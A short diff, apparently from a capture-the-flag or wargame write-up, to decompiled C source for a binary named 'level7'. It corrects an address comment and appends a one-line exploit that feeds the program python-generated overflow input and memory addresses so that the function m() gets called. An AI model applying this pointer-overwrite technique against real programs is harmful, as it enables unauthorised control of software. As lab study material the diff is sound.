@@ -1,6 +1,6 @@
 char *str;
 
-int m() // 0x80484f4
+int m() // 0x080484f4
 {
     return printf("%s - %d\n", &str, time(NULL));
 }
@@ -23,3 +23,5 @@ int main( int argc, char *argv[] )
 
     return 0;
 }
+
+./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
